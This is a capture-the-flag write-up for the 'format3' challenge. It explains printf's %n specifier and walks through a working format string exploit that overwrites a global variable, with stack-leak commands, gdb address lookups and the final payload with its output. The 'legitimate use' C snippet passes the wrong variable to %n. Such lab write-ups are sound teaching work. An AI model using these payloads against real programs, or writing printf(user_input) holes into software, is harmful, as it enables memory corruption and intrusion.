---
title:  "format3 Writeup"
date:   2019-03-27 11:08:00
categories: writeup 
layout: post
author: Thomas White
---


The basis for the `format` problems are exploiting one of the many variations of `printf` in C. At first glance, it seems odd that a function as simple `printf` would be vulnerable. It just puts characters in the terminal, right? To gain some more insight, let's look at the flags you can use construct a format string out of (table abridged from [wikipeida](https://en.wikipedia.org/wiki/Printf_format_string#Type_field)):

| Character | Description |
|-----------|-------------|
| ...       | ... |
| "d, i"    | int as a signed decimal number ...|
| u         | Print decimal unsigned int.|
| "f, F"    | double in normal (fixed-point) notation ...|
| "e, E"    | double value in standard form ...|
| "g, G"    | double in either normal or exponential notation ... |
| "x, X"    | unsigned int as a hexadecimal number ... |
| o         | unsigned int in octal.|
| s         | null-terminated string.|
| c         | char (character).|
| ...       | ... |
| "a, A"    | double in hexadecimal notation ...|
| **n**     | Print nothing, but **writes the number of characters successfully written so far into an integer pointer** ...|

That looks interesting! It seems `printf` is not only allowed to 'print' to the terminal, but can also 'print' to a memory address. A legitimate use of this could look something like:

```c
int character_limit = 30;
int characters_input = 0;
printf("You input: ");
printf("%s%n\n", user_input, &character_limit);
if(characters_input > character_limit){
    printf("Maximum characters allowed is %d\n", chacter_limit);
    exit(1);
}
```

With `%n` in mind, let's take a brief look at the (abbreviated) source code for `format3`:

```c
int target;


void printbuffer(char *string)
{
  printf(string);
}
 ...

void vuln()
{
 ...
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);

  if(target == 0x01025544) {
    printf("you have modified the target correctly :)\n");
 ...
}
```

We see this time is that we are going to make `target = 0x01025544`. The first step to this is to find where our input is going to be relative to the `printf` call. We can do this by simply running the program.


```bash
python -c 'print "AABB"+" %x"*20' | ./format3

AABB f7f73e20 f7dd8fbb 0 f7f4b000 0 ffb49a68 8048527 ffb4981c 200 f7f4b5c0 f7f7080a f7f86000 f7d77dc8 f7f59580 42424141 20782520 25207825 78252078 20782520 25207825
target is 00000000 :(
```

Notice that in the 15th `%x` we see the beginning of our input AABB as hex `42424141`. Now we know that we need 15 format string flags in order to read the first 4 bytes of our input.

Next we need to find the address of `target` to put in our exploit string. Load up the binary in gdb and run:

```gdb
(gdb) b main
Breakpoint 1 at 0x80485b2: file format3.c, line 35.
(gdb) r
Starting program: /home/vagrant/challenges/format3r/format3
Breakpoint 1, main (argc=0x1, argv=0xffffd5e4) at format3.c:35
35        vuln();
(gdb) info address target
Symbol "target" is static storage at address 0x804a048.
```

As we can see, `target` is located at `0x804a048`. So what part of memory is that? A quick look at `info proc map` tells us that this address does not lie in the stack, but the output isn't super helpful otherwise. To answer our question, we need to use another utility: `readelf`. A quick call to `readelf -S format3` will give us all of the sections in our ELF[^1] binary and a quick look will tell us that address `0x804a048` falls into `.bss`. The `.bss` section is a location in memory that holds unitilized data, all of which will be initialized to zeros when the program starts execution. Ah, so we can conclude that our compiler decided that the `.bss` section was to the best place to put the unitialized global variable `target`. In the absence of ASLR, we also suspect that this address will remain the same both inside and outside of gdb.

[^1]: [ELF](/papers/elf.pdf) is the file format used by Linux executables.

If we pull this all together, our current exploit string looks like `python -c "print '\x48\xa0\x04\x08'+'%x'*15"` which would stop printing after it prints `804a048`. We need to subtract 1 `%x` and replace it with a `%n` for the value of `target` to get changed, so let's see what happens when we run

```bash
python -c "print '\x48\xa0\x04\x08'+'%x'*14+'%n'" | ./format3

Hf7fe7e20f7e4cfbb0f7fbf0000ffb6a5b88048527ffb6a36c200f7fbf5c0f7fe480af7ffa000f7debdc8f7fcd580
target is 00000060 :(
```

Great! We are setting values! `target` is now equal to `0x60`. Now we just need to do the character math to make it `target` equal `0x01025544`.

First let's replace all the `%x` with `%c` to ensure that 1 character is printed out per format string flag. Let's leave the last `%x` to allow us to specify padding and get the exact value we want in `target`. `0x01025544` in decimal is `16930116`. Then we do some subtraction:`16930116 characters needed - 13 %c's - 4 (target address) = 16930099 additional characters to print`.

This yields a format string of `python -c "print '\x48\xa0\x04\x08'+'%c'*13+'%.16930099x'+'%n'"`. Let's run it and see what it 
does:

```bash
python -c "print '\x48\xa0\x04\x08'+'%c'*13+'%.16930099x'+'%n'" | ./format3

you have modified the target correctly :)
flag: hello world!
```
